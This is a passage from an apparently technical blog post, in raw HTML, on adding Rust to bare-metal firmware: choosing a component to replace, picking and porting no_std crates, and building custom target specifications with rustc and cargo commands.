baseline;"> through the crate-level </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">#![no_std] </span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">attribute. This crate is said to be </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> compatible. The rest of the blog will focus on these.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Choosing a Component to Replace</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">When choosing a component to replace, focus on self-contained components with robust testing. Ideally, the components functionality can be provided by an open-source implementation readily available which supports bare-metal environments.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Parsers which handle standard and commonly used data formats or protocols (such as, XML or DNS) are good initial candidates. This ensures the initial effort focuses on the challenges of integrating Rust with the existing code base and build system rather than the particulars of a complex component and simplifies testing. This approach eases introducing more Rust later on.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Choosing a Pre-Existing Crate (Rust Library)</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Picking the right open-source crate (Rust library) to replace the chosen component is crucial. Things to consider are:</span></p><ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li dir="ltr" style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline; white-space: pre;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; vertical-align: baseline;">Is the crate well maintained, for example, are open issues being addressed and does it use recent crate versions?</span></p></li><li dir="ltr" style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline; white-space: pre;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; vertical-align: baseline;">How widely used is the crate? This may be used as a quality signal, but also important to consider in the context of using crates later on which may depend on it.</span></p></li><li dir="ltr" style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline; white-space: pre;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; vertical-align: baseline;">Does the crate have acceptable documentation?</span></p></li><li dir="ltr" style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline; white-space: pre;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; vertical-align: baseline;">Does it have acceptable test coverage?</span></p></li></ul><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Additionally, the crate should ideally be </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> compatible, meaning the standard library is either unused or can be disabled. While a wide range of </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> compatible crates exist, others do not yet support this mode of operation – in those cases, see the next section on converting a </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> library to </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">By convention, crates which optionally support </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> will provide an </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> feature to indicate whether the standard library should be used. Similarly, the </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> feature usually indicates using an allocator is optional.</span></p><br /><div align="left" dir="ltr"><table style="border-collapse: collapse; border: none;"><colgroup><col width="67" /><col width="790" /></colgroup><tbody><tr style="height: 54.75pt;"><td style="background-color: #e1f5fe; overflow: hidden; padding: 14.4pt 14.4pt 14.4pt 14.4pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #01579b; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"><span style="border: none; display: inline-block; height: 40px; overflow: hidden; width: 40px;"><img height="40" src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXfPgBmsZj6ZTOto6Frw_NToC18UKVimJ8SHuCerE7W01D83L3qeJ-Qop83lTf1pvDshgc4CW3pap9aXpzVpSQZtG9EVZDzIQKD5x3vZ4yiEGDxMODTUTNZtlGMVy3Sh-I1i4x-QY8RzBAaqOSap6rGuC9WYg4pdhUO5vY_-OqUCcPssnZAYmUKb-FnV5Ainemg?key=NlrS0k5AvJIpHEA9_mIwTQ" style="margin-left: 0px; margin-top: 0px;" width="40" /></span></span></p></td><td style="background-color: #e1f5fe; overflow: hidden; padding: 14.4pt 14.4pt 14.4pt 14.4pt; vertical-align: middle;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; font-weight: 700; vertical-align: baseline;">Note:</span><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> Even when a library declares </span><span style="background-color: transparent; color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">#![no_std] </span><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">in its source, there is no guarantee that its dependencies don’t depend on </span><span style="background-color: transparent; color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">std</span><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">. We recommend looking through the dependency tree to ensure that all dependencies support </span><span style="background-color: transparent; color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, or test whether the library compiles for a </span><span style="background-color: transparent; color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> target. The only way to know is currently by trying to compile the crate for a bare-metal target.</span></p></td></tr></tbody></table></div><br /><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">For example, one approach is to run </span><span style="color: #0f9d58; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">cargo check</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> with a bare-metal toolchain provided through </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">rustup</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">:</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>$ rustup target add aarch64-unknown-none</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>$ cargo check</span><span> </span><span>--target</span><span> </span><span>aarch64-unknown-none --no-default-features</span></p><br /><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 14pt;"><span>Porting a </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">std</span><span> Library to </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">no_std</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">If a library does not support </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, it might still be possible to port it to a bare-metal environment – especially file format parsers and other OS agnostic workloads. Higher-level functionality such as file handling, threading, and async code may present more of a challenge. In those cases, such functionality can be hidden behind feature flags to still provide the core functionality in a </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> build.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">To port a </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crate to </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> (</span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">core</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">+</span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">):</span></p><ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li dir="ltr" style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline; white-space: pre;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; vertical-align: baseline;">In the </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">cargo.toml</span><span style="font-size: 11pt; vertical-align: baseline;"> file, add a </span><span style="color: #0d904f; font-size: 11pt; vertical-align: baseline;">std</span><span style="font-size: 11pt; vertical-align: baseline;"> feature, then add this </span><span style="color: #0d904f; font-size: 11pt; vertical-align: baseline;">std</span><span style="font-size: 11pt; vertical-align: baseline;"> feature to the </span><span style="color: #0d904f; font-size: 11pt; vertical-align: baseline;">default </span><span style="font-size: 11pt; vertical-align: baseline;">features</span></p></li><li dir="ltr" style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline; white-space: pre;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-size: 11pt; vertical-align: baseline;">Add the following lines to the top of the </span><span style="color: #0d904f; font-size: 11pt; vertical-align: baseline;">lib.rs</span><span style="font-size: 11pt; vertical-align: baseline;">:</span></p></li></ul><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">#![no_std]</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">#[cfg(feature = "std")]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #9c27b0; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">extern</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> crate std</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #9c27b0; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">extern</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> crate alloc</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">;</span></p></td></tr></tbody></table></div><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Then, iteratively fix all occurring compiler errors as follows:</span></p><ol style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li dir="ltr"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Move any </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">use</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> directives from </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> to either </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">core</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> or </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p></li><li dir="ltr"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Add </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">use</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> directives for all types that would otherwise automatically be imported by the </span><a href="https://doc.rust-lang.org/std/prelude/index.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">std prelude</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, such as </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc::vec::Vec</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> and</span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> alloc::string::String</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p></li><li dir="ltr"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Hide anything that doesn't exist in </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">core</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> or </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> and cannot otherwise be supported in the </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> build (such as file system accesses) behind a </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">#[cfg(feature = </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">"</span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">std</span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">"</span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">)] </span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">guard.</span></p></li><li dir="ltr" style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline; white-space: pre;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; vertical-align: baseline;">Anything that needs to interact with the embedded environment may need to be explicitly handled, such as functions for I/O. These likely need to be behind a </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">#[cfg(not(feature = "std"))]</span><span style="font-size: 11pt; vertical-align: baseline;"> guard.</span></p></li><li dir="ltr" style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline; white-space: pre;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-size: 11pt; vertical-align: baseline;">Disable </span><span style="color: #0d904f; font-size: 11pt; vertical-align: baseline;">std</span><span style="font-size: 11pt; vertical-align: baseline;"> for all dependencies (that is, change their definitions in </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">Cargo.toml</span><span style="font-size: 11pt; vertical-align: baseline;">, if using Cargo).</span></p></li></ol><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span>This needs to be repeated for all dependencies within the crate dependency tree that do not support </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span> yet.</span></p><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 20pt;"><span style="font-family: Arial, sans-serif; font-size: 20pt; font-weight: 400; vertical-align: baseline;">Custom Target Architectures</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">There are a number of officially </span><a href="https://doc.rust-lang.org/rustc/platform-support.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">supported targets</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> by the Rust compiler, however, many bare-metal targets are missing from that list. Thankfully, the Rust compiler lowers to LLVM IR and uses an internal copy of LLVM to lower to machine code. Thus, it can support any target architecture that LLVM supports by defining a custom target.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Defining a custom target requires a toolchain built with the </span><a href="https://github.com/rust-lang/rust/blob/master/config.example.toml#L577-L580"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">channel set to dev or nightly</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">. Rust’s </span><a href="https://docs.rust-embedded.org/embedonomicon/custom-target.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Embedonomicon</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> has a wealth of information on this subject and should be referred to as the source of truth.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">To give a quick overview, a custom target JSON file can be constructed by finding a similar supported target and dumping the JSON representation:</span></p><br /><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">$ rustc </span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">--</span><span style="background-color: transparent; color: #9c27b0; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">print</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> target</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">list</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">[...]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">armv7a</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">none</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">eabi</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">[...]</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">$ rustc </span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">Z unstable</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">options </span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">--</span><span style="background-color: transparent; color: #9c27b0; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">print</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> target</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">spec</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">json </span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">--</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">target armv7a</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">none</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">eabi</span></p></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">This will print out a target JSON that looks something like:</span></p><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">$ rustc </span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">--</span><span style="background-color: transparent; color: #9c27b0; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">print</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> target</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">spec</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">json </span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">Z unstable</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">options </span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">--</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">target</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">=</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">armv7a</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">none</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">eabi</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #0f9d58; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">"abi"</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">:</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> </span><span style="background-color: transparent; color: #0f9d58; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">"eabi"</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #0f9d58; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">"arch"</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">:</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> </span><span style="background-color: transparent; color: #0f9d58; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">"arm"</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #0f9d58; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">"c-enum-min-bits"</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 